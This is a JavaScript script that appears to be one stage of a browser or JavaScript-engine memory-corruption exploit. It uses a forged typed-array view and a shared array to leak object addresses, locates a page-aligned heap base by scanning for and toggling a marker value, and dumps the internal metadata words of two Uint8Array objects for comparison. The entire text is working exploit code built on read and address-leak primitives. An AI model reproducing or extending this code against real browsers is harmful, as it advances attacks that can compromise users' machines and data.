// Compare two rooted, same-length Uint8Array cells in the calibrated range.
// Read-only; the backing stores need not be in the forged view's scan window.
var state = window.__fw14ArrayState;
var result;
var phase = "preflight";
try {
  if (!state || !state.view || !state.array || !state.a ||
      !state.addressAnchor || !state.ownedTypedView ||
      state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344 ||
      state.ownedTypedView.length !== 65536)
    throw new Error("held_typed_view_preflight_failed");
  var forged = state.view;
  function matches(at, value) {
    return forged[at] === (value & 255) &&
      forged[at + 1] === (value >>> 8 & 255) &&
      forged[at + 2] === (value >>> 16 & 255) &&
      forged[at + 3] === (value >>> 24 & 255);
  }
  function wordOf(value) {
    var bytes = [];
    try {
      state.array[0] = value;
      for (var b = 0; b < 8; b++) bytes.push(forged[state.index + b]);
    } finally {
      state.array[0] = state.a;
    }
    var out = "0x";
    for (var h = 7; h >= 0; h--)
      out += bytes[h].toString(16).padStart(2, "0");
    return out;
  }
  var anchorWord = wordOf(state.addressAnchor);
  var candidates = [];
  for (var i = 2097152; i + 3 < 4194304; i++)
    if (matches(i, 0x11223344)) {
      if (candidates.length === 32) throw new Error("anchor_candidates_capped");
      candidates.push(i);
    }
  var live = [];
  try {
    state.addressAnchor.marker = 0x55667788;
    for (var c = 0; c < candidates.length; c++)
      if (matches(candidates[c], 0x55667788)) live.push(candidates[c]);
  } finally {
    state.addressAnchor.marker = 0x11223344;
  }
  if (live.length !== 1 || !matches(live[0], 0x11223344))
    throw new Error("anchor_live_count_" + live.length);
  var base = Number(anchorWord) + 8 - live[0];
  if (!Number.isSafeInteger(base) || base % 4096 !== 0)
    throw new Error("base_not_page_aligned");
  phase = "compare";
  var a = state.ownedTypedView;
  var b = new Uint8Array(65536);
  b.fill(0x42);
  state.otherTypedView = b;
  var aWord = wordOf(a);
  var bWord = wordOf(b);
  var aIndex = Number(aWord) - base;
  var bIndex = Number(bWord) - base;
  if (!Number.isSafeInteger(aIndex) || !Number.isSafeInteger(bIndex) ||
      aIndex < 0 || bIndex < 0 ||
      aIndex + 95 >= 16777216 || bIndex + 95 >= 16777216)
    throw new Error("typed_cell_outside_window");
  function readWords(at) {
    var list = [];
    for (var off = 0; off < 96; off += 8) {
      var out = "0x";
      for (var q = 7; q >= 0; q--)
        out += forged[at + off + q].toString(16).padStart(2, "0");
      list.push(out);
    }
    return list;
  }
  var aWords = readWords(aIndex);
  var bWords = readWords(bIndex);
  var different = [];
  for (var w = 0; w < aWords.length; w++)
    if (aWords[w] !== bWords[w]) different.push(w * 8);
  result = { id: "typed_cell_compare", status: "pass", details: {
    base: "0x" + base.toString(16), a_word: aWord,
    b_word: bWord, a_index: aIndex, b_index: bIndex,
    a_words: aWords.join(","), b_words: bWords.join(","),
    different_offsets: different.join(","),
    a_byte: a[0], b_byte: b[0],
    array_restored: state.array[0] === state.a
  } };
} catch (error) {
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "typed_cell_compare", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
